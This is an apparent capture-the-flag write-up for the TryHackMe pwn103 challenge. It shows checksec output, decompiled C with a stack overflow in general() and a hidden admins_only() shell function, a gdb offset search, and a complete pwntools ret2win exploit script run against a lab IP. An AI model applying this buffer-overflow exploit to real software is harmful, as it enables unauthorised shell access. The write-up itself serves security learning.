# pwn103

```bash
â”Œâ”€â”€(zeqzoqã‰¿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
â””â”€$ file pwn103-1644300337872.pwn103
pwn103-1644300337872.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
```

```bash
â”Œâ”€â”€(zeqzoqã‰¿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
â””â”€$ checksec pwn103-1644300337872.pwn103
[*] '/mnt/c/Users/hzqzz/Downloads/pwn101/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

here is the overview when running it because there was many feature

```bash
â”Œâ”€â”€(zeqzoqã‰¿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
â””â”€$ ./pwn103-1644300337872.pwn103
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 1

ğŸ“¢ Announcements:

A new room is available!
Check it out: https://tryhackme.com/room/binaryexploitation

â”Œâ” â”¬â”Œâ”â”Œâ”Œâ”€â”â”¬â”€â”â”¬ â”¬â”Œâ”€â”â”€â” â”¬â”Œâ”€â”â”¬  â”Œâ”€â”â”¬â”Œâ”¬â”â”Œâ”€â”â”Œâ”¬â”â”¬â”Œâ”€â”â”Œâ”â”Œ
â”œâ”´â”â”‚â”‚â”‚â”‚â”œâ”€â”¤â”œâ”¬â”˜â””â”¬â”˜â”œâ”¤ â”Œâ”´â”¬â”˜â”œâ”€â”˜â”‚  â”‚ â”‚â”‚ â”‚ â”œâ”€â”¤ â”‚ â”‚â”‚ â”‚â”‚â”‚â”‚
â””â”€â”˜â”´â”˜â””â”˜â”´ â”´â”´â””â”€ â”´ â””â”€â”˜â”´ â””â”€â”´  â”´â”€â”˜â””â”€â”˜â”´ â”´ â”´ â”´ â”´ â”´â””â”€â”˜â”˜â””â”˜

ğŸ‘¾ Beginner level room has some challenges based on stack exploitation

â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 2

ğŸ“œ Rules:

1ï¸âƒ£  Don't ping @everyone ğŸ˜¾
2ï¸âƒ£  Don't rick roll anyone ğŸ˜’ Rick roll yourself ğŸ˜
3ï¸âƒ£  Don't post memes ğŸ˜‘, otherwise you'll become a meme ğŸ¤¡
4ï¸âƒ£  We know sharing is caring ğŸ¤—, But don't share your writeups here lmaoğŸ¤¦â€â™‚
5ï¸âƒ£  Respect everyone in our communityğŸ¤—

â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 3

ğŸ—£  General:

------[jopraveen]: Hello pwners ğŸ‘‹
------[jopraveen]: Hope you're doing well ğŸ˜„
------[jopraveen]: You found the vuln, right? ğŸ¤”

------[pwner]: yes
------[jopraveen]: GG ğŸ˜„

â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 4

ğŸ  rooms discussion:

--[Welcome to Room Discussion]--

-----[jopraveen]: Don't post spoilers here ğŸ™‚
-----[jopraveen]: Keep the chats relevent to this room ğŸ™‚
-----[jopraveen]: Good luck everyone ğŸ˜„

â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 5
ğŸ¤– Bot commands:

root@pwn101:~/root# whoami
root@pwn101:~/root# ls
root@pwn101:~/root# pwd
root@pwn101:~/root# caty
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: ^C
```

and the source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char **v3; // rdx
  int result; // eax
  int v5; // [rsp+Ch] [rbp-4h] BYREF

  setup(argc, argv, envp);
  banner();
  puts(&byte_403298);
  puts(a1_0);
  puts(&byte_403298);
  printf(&byte_403323);
  __isoc99_scanf(&unk_403340, &v5);
  switch ( v5 )
  {
    case 1:
      result = announcements();
      break;
    case 2:
      result = rules();
      break;
    case 3:
      result = general();
      break;
    case 4:
      result = discussion();
      break;
    case 5:
      result = bot_cmd();
      break;
    default:
      result = main((int)&unk_403340, (const char **)&v5, v3);
      break;
  }
  return result;
}
```

```c
int __fastcall announcements(__int64 a1, const char **a2)
{
  const char **v2; // rdx

  puts(asc_402158);
  puts("A new room is available!");
  puts("Check it out: \x1B[0;34mhttps://tryhackme.com/room/binaryexploitation\x1B[0m\n");
  puts(&byte_4021D0);
  puts(&byte_402360);
  return main((int)&byte_402360, a2, v2);
}
```

```c
int __fastcall rules(__int64 a1, const char **a2)
{
  const char **v2; // rdx

  puts(s);
  puts(::a1);
  puts(::a2);
  puts(a3);
  puts(a4);
  puts(a5);
  return main((int)a5, a2, v2);
}
```

```c
int general()
{
  const char **v0; // rdx
  char s1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(asc_4023AA);
  puts(aJopraveenHello);
  puts(aJopraveenHopeY);
  puts(aJopraveenYouFo);
  printf("------[pwner]: ");
  __isoc99_scanf("%s", s1);
  if ( strcmp(s1, "yes") )
    return puts(aTryHarder);
  puts(aJopraveenGg);
  return main((int)aJopraveenGg, (const char **)"yes", v0);
}
```

```c
int __fastcall discussion(__int64 a1, const char **a2)
{
  const char **v2; // rdx

  puts(asc_402E01);
  puts("--[Welcome to Room Discussion]--\n");
  puts(aJopraveenDonTP);
  puts(aJopraveenKeepT);
  puts(aJopraveenGoodL);
  return main((int)aJopraveenGoodL, a2, v2);
}
```

```c
int __fastcall bot_cmd(__int64 a1, char *a2)
{
  char *v2; // rdi
  const char **v3; // rdx
  char buf[10]; // [rsp+2h] [rbp-Eh] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  v2 = (char *)&byte_402492;
  puts(&byte_402492);
  for ( i = 0; i <= 3; ++i )
  {
    printf("root@pwn101:~/root# ");
    read(0, buf, 0xAuLL);
    a2 = "/help";
    if ( !strncmp(buf, "/help", 5uLL) )
    {
      puts(asc_4024C1);
      puts("/rank");
      puts("/invite");
      puts("/help");
      v2 = "/meme\n";
      puts("/meme\n");
    }
    else
    {
      a2 = "/rank";
      if ( !strncmp(buf, "/rank", 5uLL) )
      {
        v2 = asc_4024F8;
        puts(asc_4024F8);
      }
      else
      {
        a2 = "/invite";
        if ( !strncmp(buf, "/invite", 7uLL) )
        {
          v2 = "\nOur Discord server link: \x1B[0;34mhttps://discord.gg/JxhCHPajsv\x1B[0m\n";
          puts("\nOur Discord server link: \x1B[0;34mhttps://discord.gg/JxhCHPajsv\x1B[0m\n");
        }
        else
        {
          a2 = "/meme";
          v2 = buf;
          if ( !strncmp(buf, "/meme", 5uLL) )
          {
            v2 = asc_402670;
            puts(asc_402670);
          }
        }
      }
    }
  }
  return main((int)v2, (const char **)a2, v3);
}
```

```c
int admins_only()
{
  puts(asc_403267);
  puts(aWelcomeAdmin);
  return system("/bin/sh");
}
```

The exploit strategy here is the buffer overflow in `general()` to ret2win to `admins_only()` to get `/bin/sh`

So lets find the buffer offset in general() via gdb.

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /mnt/c/Users/hzqzz/Downloads/pwn101/pwn103-1644300337872.pwn103
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â¡Ÿâ â „â „â „â „â „â „â „â „â „â „â „â „â „â „â ˆâ¢¹â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â¢ â£´â£¾â£µâ£¶â£¶â£¾â£¿â£¦â¡„â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢€â£¾â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â¡„â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â¢¸â£¿â£¿â£§â£€â£¼â£¿â£„â£ â£¿â£¿â£¿â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â ˜â »â¢·â¡¯â ›â ›â ›â ›â¢«â£¿â Ÿâ ›â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â¡‡â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£§â¡€â „â „â „â „â „â „â „â „â „â „â „â¢¡â£€â „â „â¢¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£†â£¸â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿

  [THM Discord Server]

â–â–â–â–â–â–â–â–â–â–â–
1) ğŸ“¢ Announcements
2) ğŸ“œ Rules
3) ğŸ—£  General
4) ğŸ  rooms discussion
5) ğŸ¤– Bot commands
â–â–â–â–â–â–â–â–â–â–â–
âŒ¨ï¸  Choose the channel: 3

ğŸ—£  General:

------[jopraveen]: Hello pwners ğŸ‘‹
------[jopraveen]: Hope you're doing well ğŸ˜„
------[jopraveen]: You found the vuln, right? ğŸ¤”

------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Try harder!!! ğŸ’ª

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 RAX  0x13
 RBX  0x7fffffffd8a8 â€”â–¸ 0x7fffffffdb8e â—‚â€” '/mnt/c/Users/hzqzz/Downloads/pwn101/pwn103-1644300337872.pwn103'
 RCX  0x7ffff7ea4210 (write+16) â—‚â€” cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7f89710 (_IO_stdfile_1_lock) â—‚â€” 0
 RSI  0x7ffff7f88643 (_IO_2_1_stdout_+131) â—‚â€” 0xf89710000000000a /* '\n' */
 R8   0xa
 R9   0xffffffff
 R10  3
 R11  0x202
 R12  0
 R13  0x7fffffffd8b8 â€”â–¸ 0x7fffffffdbce â—‚â€” 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) â€”â–¸ 0x7ffff7ffe2e0 â—‚â€” 0
 R15  0
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffd778 â—‚â€” 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
 RIP  0x401377 (general+185) â—‚â€” ret
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x401377 <general+185>    ret                                <0x6161616161616166>
    â†“









â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7fffffffd778 â—‚â€” 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008â”‚     0x7fffffffd780 â—‚â€” 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010â”‚     0x7fffffffd788 â—‚â€” 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018â”‚     0x7fffffffd790 â—‚â€” 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020â”‚     0x7fffffffd798 â—‚â€” 'jaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028â”‚     0x7fffffffd7a0 â—‚â€” 'kaaaaaaalaaaaaaamaaa'
06:0030â”‚     0x7fffffffd7a8 â—‚â€” 'laaaaaaamaaa'
07:0038â”‚     0x7fffffffd7b0 â—‚â€” 0x6161616d /* 'maaa' */
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0         0x401377 general+185
   1 0x6161616161616166 None
   2 0x6161616161616167 None
   3 0x6161616161616168 None
   4 0x6161616161616169 None
   5 0x616161616161616a None
   6 0x616161616161616b None
   7 0x616161616161616c None
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Then noting the address for admin\_only()

```bash
pwndbg> info function
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  strncmp@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  read@plt
0x0000000000401080  strcmp@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
0x0000000000401680  __libc_csu_init
0x00000000004016e0  __libc_csu_fini
0x00000000004016e4  _fini
```

admins\_only() is at 0x0000000000401554. Here is the exploit script.

```bash
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn103-1644300337872.pwn103'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()
rop = ROP(elf)

offset = 0x28


padding = b"A" * offset
win = elf.sym['admins_only']
ret_gadget = rop.find_gadget(['ret'])[0]

payload = padding + p64(ret_gadget) + p64(win)

def send_payload():
    io.recvuntil('Choose the channel:')
    io.sendline('3')
    io.recvuntil('------[pwner]: ')
    io.sendline(payload)

send_payload()
# Got Shell?
io.interactive()
```

```bash
â”Œâ”€â”€(zeqzoqã‰¿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
â””â”€$ python exploit.py REMOTE 10.10.47.113 9003
